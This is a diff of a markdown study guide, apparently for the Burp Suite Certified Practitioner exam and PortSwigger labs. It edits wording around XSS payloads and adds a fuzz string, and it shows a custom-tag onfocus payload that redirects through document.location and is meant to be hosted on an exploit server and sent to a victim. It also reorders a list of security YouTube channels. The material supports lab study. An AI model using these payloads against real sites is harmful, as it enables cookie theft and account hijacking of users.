@@ -348,7 +348,7 @@ document.cookie = "TopSecret=UnsecureCookieValue4Peanut2019";
   
 ### Identify allowed Tags  
 
->Basic XSS Payloads to ***identify*** application controls for handling data received in HTTP request.   
+>Basic XSS Payloads to ***identify*** application security filter controls for handling data received in HTTP request.  
 
 ```html
 <img src=1 onerror=alert(1)>
@@ -358,9 +358,13 @@ document.cookie = "TopSecret=UnsecureCookieValue4Peanut2019";
 "><svg><animatetransform onbegin=alert(1)>
 ```  
 
->Submitting the above payloads may give response message, ***"Tag is not allowed"***. Then ***identify*** allowed tags using [methodology](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked).  
+```
+<>\'\"<script>{{7*7}}$(alert(1)}fuzzer
+```  
 
->The below lab gives great **Methodology** to ***identify*** allowed HTML tags and events for crafting POC XSS.  
+>Submitting the above payloads may give response message, ***"Tag is not allowed"***. Then ***identify*** allowed tags using [PortSwigger Academy Methodology](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked).  
+
+>This lab gives great **Methodology** to ***identify*** allowed HTML tags and events for crafting POC XSS.  
 
 >Host **iframe** code on exploit server and deliver exploit link to victim.  
 
@@ -403,9 +407,9 @@ https://TARGET.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocume
   
 ### Custom Tags not Blocked  
   
->Another application also respond with message ***"Tag is not allowed"*** when attempting to insert XSS script, but if we create custom tag it is bypassed.  
+>Application respond with message ***"Tag is not allowed"*** when attempting to insert XSS payloads, but if we create a custom tag it is bypassed.  
 
-```
+```html
 <xss+id=x>#x';
 ```  
 
@@ -417,7 +421,7 @@ location = 'https://TARGET.net/?search=<xss+id=x+onfocus=document.location='http
 </script>
 ```
    
->**Note:** The custom tag with the ID ```x```, which contains an **onfocus** event handler that triggers the ```document.location``` function. The **HASH** character at the end of the URL focuses on this element as soon as the page is loaded, causing the payload to be called. Host the payload script on the exploit server in ```script``` tags, and send to victim. Below is the same payload but **URL-encoded** format.  
+>**Note:** The custom tag with the ID ```x```, which contains an **onfocus** event handler that triggers the ```document.location``` function. The **HASH** `#` character at the end of the URL focuses on this element as soon as the page is loaded, causing the payload to be called. Host the payload script on the exploit server in ```script``` tags, and send to victim. Below is the same payload but **URL-encoded** format.  
 
 ```
 <script>
@@ -2813,17 +2817,17 @@ CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)
 - [My YouTube BSCP Study Playlist](https://youtube.com/playlist?list=PLsDxQTEdg_YkVMP6PybE7I-hAdhR7adem)  
 - [Cookies, Sessions, JSON Web Tokens (JWT) Explained](https://youtu.be/uXDnS5PcjCA)  
 
-Youtube Information Security content creators channels:  
+Youtube Information Security content creators channels (***in no particular order***):  
 
 1. [Rana Khalil](https://www.youtube.com/@RanaKhalil101/videos)  
 2. [TJCHacking](https://www.youtube.com/@tjchacking/videos)  
 3. [intigriti](https://www.youtube.com/@intigriti/videos)  
 4. [Seven Seas Security](https://www.youtube.com/@7SeasSecurity/videos)  
 5. [z3nsh3ll](https://www.youtube.com/@z3nsh3ll/videos)  
-6. [The Cyber Mentor](https://www.youtube.com/@TCMSecurityAcademy/videos)  
-7. [Tib3rius](https://www.youtube.com/@Tib3rius/videos)  
-8. [John Hammond](https://www.youtube.com/@_JohnHammond/videos)  
-9. [TraceTheCode](https://www.youtube.com/@TraceTheCode/videos)  
+6. [Tib3rius](https://www.youtube.com/@Tib3rius/videos)  
+7. [John Hammond](https://www.youtube.com/@_JohnHammond/videos)  
+8. [TraceTheCode](https://www.youtube.com/@TraceTheCode/videos)  
+9. [The Cyber Mentor](https://www.youtube.com/@TCMSecurityAcademy/videos)  
 10. [Sabyasachi Paul](https://www.youtube.com/@h0tPlug1n/videos)  
 11. [bmdyy](https://www.youtube.com/@bmdyy/videos)  
 12. [CyberSecurityTV](https://www.youtube.com/@CyberSecurityTV/videos)  
